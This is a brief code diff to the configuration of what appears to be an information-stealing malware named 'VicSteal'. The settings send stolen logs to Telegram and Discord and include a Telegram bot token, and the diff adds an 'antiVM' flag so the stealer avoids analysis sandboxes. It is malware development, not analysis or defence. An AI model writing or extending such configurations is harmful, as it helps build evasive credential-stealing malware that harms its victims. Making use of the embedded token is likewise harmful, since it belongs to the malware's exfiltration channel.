@@ -1,6 +1,7 @@
 config: dict[str, str] = {
   "logFileName": f"VicSteal-New-Log",
   "UACAdmin": False,
+  "antiVM": True,
   "sendToTelegram": True,
   "sendToDiscord": True,
   "telegramBotToken": "8915595:-KW0DT09u4n5xUTyIV61rZ3sX645M",
